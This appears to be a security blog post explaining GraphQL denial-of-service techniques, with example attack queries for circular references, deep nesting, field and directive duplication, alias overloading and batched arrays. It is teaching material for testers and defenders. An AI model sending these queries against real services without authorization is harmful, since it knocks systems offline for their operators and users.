---
title: "GraphQL Denial of Service"
date: "2025-07-03"
categories: [Worse Quality]
tags: [GraphQL, API]
---
# Introduction
Denial of Service might seem to be a less impactful attack type than others, but this is often not the case. A successful DoS attack can cause a company to lose millions of money and/or trust from their customers, and lead to reputation loss.
These vulnerabilities usually don't expose Personally Identifiable Information (PII), allow privilege escalation, or compromise user accounts.
In order to prove concept, you need to deny service to a customer, which is nasty, this is why most bug bounty programs exclude this type of vulnerability, resulting in most hunters not even testing for it since they don't care.
To exploit DoS, you don’t necessarily need user input; this vulnerability is more based in architecture and not necessarily implementation, which is why some developers might overlook it.

# Denial of Service in GraphQL
DoS vulnerabilities are quite common in GraphQL, which is why it’s important to become familiar with this type of attack. I will briefly talk about the following Denial of Service attack vectors:
- Circular Queries
- Unbounded Query Depth
- Field Duplication
- Alias Overloading *
- Directive Overloading
- Array-Based Query Batching

(* means you can also use it for brute-forcing, thought it might be useful)
## Circular Queries
Recursive queries occur when two nodes in a GraphQL schema are bidirectionally referenced. Recursive queries can be used by a client to make the server run queries in "circles," effectively denying service that is being used.

![image](https://github.com/user-attachments/assets/aad80359-c020-4f0d-87a2-34c18942fc53)

### Exploitation Example
Circular reference in schema:
```
type user {
name: String
location: location
}

type location {
resident: user
place: String
}
```
Exploitation query:
```
query {
  user {
    location {
      user {
        location {
          user {
            location {
              place
            }
          }
        }
      }
    }
  }
}
```

### How it might look in real application
Below is a screenshot taken from the graphical representation of DVGA (Damn-Vulnerable-GraphQL-Application), with a highlighted circular reference:

![image](https://github.com/user-attachments/assets/4d2a6a27-5dbf-4827-bb8f-05cf535b1a31)

A circular relationship exists in GraphQL’s built-in introspection system.
Therefore, when introspection is enabled, you could potentially have access to a circular query right out of the gate. Here is another example, but with circular introspection:
```
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
            ofType {
              name
              kind
                  # Keep nesting as deep as possible
            }
          }
        }
      }
    }
  }
}
```
## Unbounded Query Depth
GraphQL lets clients build deeply nested queries that explore connections between objects. Without effective safeguards, attackers can design queries that push servers to handle exponentially growing workloads.

### exploitation example:
```
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              # Keep nesting as deep as possible
              name
              email
              phoneNumber
            }
          }
        }
      }
    }
  }
}
```
A study of 160 public GraphQL services from 2024 found that 69% had issues related to unrestricted resource consumption, highlighting the risks of unbounded field selection:
https://escape.tech/blog/the-state-of-graphql-security-2024/

## Field Duplication
As the name suggests, all you need to do to exploit it is duplicate fields. An important thing to note is that the server might respond as if it only processed one field, but we can observe that the response time is much longer when many fields are passed—so they are being resolved, it’s just not shown in the response.
### Exploitation
```
query {
  articles {
    headline
    body
    body
    body
    body
    body
    # add as many as possible
  }
}
```
## Alias Overloading
By using this technique, we can send multiple queries in a single HTTP request.
### Exploitation:
```
query {
one:resources
two:resources
three:resources
four:resources
five:resources
}
```
Instead of targeting resources directly, you would use a query that consumes the most resources on the server. You can also chain aliases with other vulnerabilities, such as a circular query.
## Directive Overloading
A directive is a way to give extra instructions in a GraphQL query or schema. It tells the server to modify how a field or operation should be executed—like including or skipping certain fields based on conditions.
It is similar to field duplication, but on most servers, it will consume fewer resources.
### Exploitation:
```
query {
  pastes {
    title @whatever@whatever@whatever@whatever# add as many as possible
    content @whatever@whatever@whatever@whatever
  }
}
```
## Array-Based Query Batching
Array-Based Query Batching is the methode based on sending multiple queries in an array. The server will respond to each one of them, but only after all of them have been processed.
### Exploitation:
```
[
query {
  location
  health
  ping
}

query {
  location
  health
  ping
}
]
```
## Conclusion
There are many ways in which we can try to DoS a server, and those servers aren’t usually guarded that well, as shown in a study: https://escape.tech/blog/the-state-of-graphql-security-2024/.

This article aims to raise awareness; please don’t use it if you are not authorized. And lastly, one interesting tactic idea for red teamers: some time ago, I was listening to Jack Rhysider’s podcast called "Darknet Diaries." He was talking with someone from the military who said something along the lines of: Usually in engagements, people want to be as stealthy as possible, but sometimes it might be beneficial to ring some alarms on the other side of the building and break in from behind when everyone is looking at the front. Thanks for your time!
### Resources
"Black Hat GraphQL: Attacking Next Generation APIs" by Nick Aleks and Dolev Farhi

https://markaicode.com/graphql-api-are-vulnerable-to-dos-attacks-in-2025/

https://escape.tech/blog/the-state-of-graphql-security-2024/
